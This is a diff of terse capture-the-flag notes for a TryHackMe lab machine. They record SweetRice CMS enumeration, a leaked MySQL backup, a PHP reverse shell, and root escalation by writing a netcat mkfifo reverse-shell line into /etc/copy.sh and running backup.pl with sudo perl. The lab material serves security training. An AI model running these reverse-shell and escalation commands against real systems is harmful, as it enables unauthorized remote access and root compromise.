@@ -1,0 +1,36 @@
+port 80 
+http://<IP>/content/as --- sweet rice plugin platform
+                   /inc 
+                       /mysql_backup --- pass hash file
+
+
+manager password123
+
+10.4.58.116
+ pentest monkey reverse php shell
+ 
+ spawn tty shell
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  
+ now we saw file backup.pl whichhas some work to do with copy.sh when we look at copy.sh , it have shell in it where we can chnge ip and port no. to one of ours 
+ now we  will run perl command to run backup.pl with permissions of www-data
+ 
+ www-data@THM-Chal:/$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.58.116 4444 >/tmp/f" > /etc/copy.sh
+<t /tmp/f|/bin/sh -i 2>&1|nc 10.4.58.116 4444 >/tmp/f" > /etc/copy.sh        
+www-data@THM-Chal:/$ cat /etc/copy.sh
+cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.58.116 4444 >/tmp/f
+www-data@THM-Chal:/$ cd /etc
+
+www-data@THM-Chal:/etc$ cd /home/itguy  
+cd /home/itguy
+www-data@THM-Chal:/home/itguy$ ls
+ls
+Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
+Documents  Music      Public    Videos     examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+since perl can run with sudo , we would have tried with gtfiobin cmd if we knew the password but since we dont know the pasword we have to find some file that can be run with perl command so that we can gain root reveerse shell
+we found backup.pl , we modified copy.sh , we started reverse shell and run backup.pl with perl stating sudo 
+ 
